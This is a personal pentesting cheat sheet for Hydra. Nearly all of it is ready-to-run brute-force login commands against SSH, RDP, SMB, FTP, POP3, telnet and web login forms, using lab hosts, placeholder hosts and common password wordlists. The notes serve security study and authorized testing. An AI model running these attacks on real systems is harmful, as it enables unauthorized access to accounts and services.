---
title: hydra 
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - brute forcing
  - windows
  - passwords
---
# Hydra

Hydra can attack nearly 50 services including: Cisco auth, FTP, HTTP, IMAP, RDP, SMB, SSH, Telnet... It uses modules for each protocol


## Basic commands

```bash
# Main syntax:
hydra -L users.txt -P pass.txt <service://server> <options>
# Example:
# hydra -L user.list -P password.list ssh://10.129.42.197
# hydra -L user.list -P password.list rdp://10.129.42.197
# hydra -L user.list -P password.list smb://10.129.42.197

# If we use a file with credentials in this format "user:password" we might use the flag -C
hydra -C <user_pass.list> <protocol>://<IP>
# Example: 
# hydra -C user_pass.list ssh://10.129.42.197

# Get information about a module
hydra -U rdp 

# Attack a telnet service
hydra -L users.txt -P pass.txt telnet://target.server  

# Attack a ssh service
hydra -L user.list -P password.list ssh://$ip

# Attack 3389 RDP
hydra -L user.list -P password.list rdp://$ip

# Attack samba
hydra -L user.list -P password.list smb://$ip

# Attack a web resource
hydra -L users-txt -P pass.txt http-get://localhost/   
# -l: specify login name
# -L: specify a list with login names
# -p: specify a single passwords
# -P: specify a file with passwords
# -C: specify a file with user:password
# -t: how many parallel connections to run when cracking
# -V: verbose
# -f: it stops the attack after finding a password
# -M: list of servers to attack, one entry per line, ‘:’ to specify port

# To see sintax of the http-get and http-post-form modules:
hydra -U http-post-form   
# This will return:
# 	 <url>:<form parameters>:<condition string>[:<optional>[:<optional>]
# 	 Example: “/login.php:userin=^USER^&passin=^PASS^:incorrect”
#	 it perform the attack in the login.php page. It uses the input label name userin (or any other, we need to retrieve this from the html code of the form) to insert the dictionary for users. It uses the input label name passin  (or any other, we need to retrieve this from the html code of the form) to insert the dictionary for passwords. It uses the word incorrect to check out the result of the login process (we need to observe the web behaviour to pick a word). For example:
hydra -l pentester -P /usr/share/wordlists/metasploit/password.lst zev0nlxhh78mfshrhzvq9h8vm.eu-central-4.attackdefensecloudlabs.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1:S=Success"


# Another example of a login form:
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 94.237.63.111 -s 47017 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
# username=^USER^&password=^PASS^: The form parameters with placeholders for Hydra.
# F=Invalid credentials: The failure condition – Hydra will consider a login attempt unsuccessful if it sees this string in the response.



# Example for ftp in a non default port
hydra -L users.txt -P pass.txt ftp://$ip:2121

# Port: Specify a non-default port for the target service.
hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
# Target the FTP service on ftp.example.com via port 2121.
# Use the ftp module and provide verbose output (-V) for detailed monitoring.


# Attacking a pop3 service
hydra -L users.txt -p 'Company01!' -f $ip pop3

# Tasks: Define the number of parallel tasks (threads) to run, potentially speeding up the attack.	
hydra -t 4 ...


# Targeting Multiple SSH Servers
hydra -l $username -p $password -M targets.txt ssh

# Testing a RDP connection with a username Administrator and a password consisting of 6 to 8 characters, including lowercase letters, uppercase letters, and numbers
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp

```


## Real-life examples

```bash
hydra crack.me http-post-form “/login.php:usr=^USER^&pwd=^PASS^:invalid credential” -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-15.txt -f

hydra 192.168.1.45 ssh -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-10.txt -f -V

hydra -l student -P /usr/share/wordlists/rockyou.txt  ssh://192.153.213.3
```


| Hydra Service | Service/Protocol                 | Description                                                                                             | Example Command                                                                                                |
| ------------- | -------------------------------- | ------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
| ftp           | File Transfer Protocol (FTP)     | Used to brute-force login credentials for FTP services, commonly used to transfer files over a network. | `hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100`                                             |
| ssh           | Secure Shell (SSH)               | Targets SSH services to brute-force credentials, commonly used for secure remote login to systems.      | `hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100`                                              |
| http-get/post | HTTP Web Services                | Used to brute-force login credentials for HTTP web login forms using either GET or POST requests.       | `hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"` |
| smtp          | Simple Mail Transfer Protocol    | Attacks email servers by brute-forcing login credentials for SMTP, commonly used to send emails.        | `hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com`                                          |
| pop3          | Post Office Protocol (POP3)      | Targets email retrieval services to brute-force credentials for POP3 login.                             | `hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com`                               |
| imap          | Internet Message Access Protocol | Used to brute-force credentials for IMAP services, which allow users to access their email remotely.    | `hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com`                               |
| mysql         | MySQL Database                   | Attempts to brute-force login credentials for MySQL databases.                                          | `hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100`                                            |
| mssql         | Microsoft SQL Server             | Targets Microsoft SQL servers to brute-force database login credentials.                                | `hydra -l sa -P /path/to/password_list.txt mssql://192.168.1.100`                                              |
| vnc           | Virtual Network Computing (VNC)  | Brute-forces VNC services, used for remote desktop access.                                              | `hydra -P /path/to/password_list.txt vnc://192.168.1.100`                                                      |
| rdp           | Remote Desktop Protocol (RDP)    | Targets Microsoft RDP services for remote login brute-forcing.                                          | `hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100`                                             |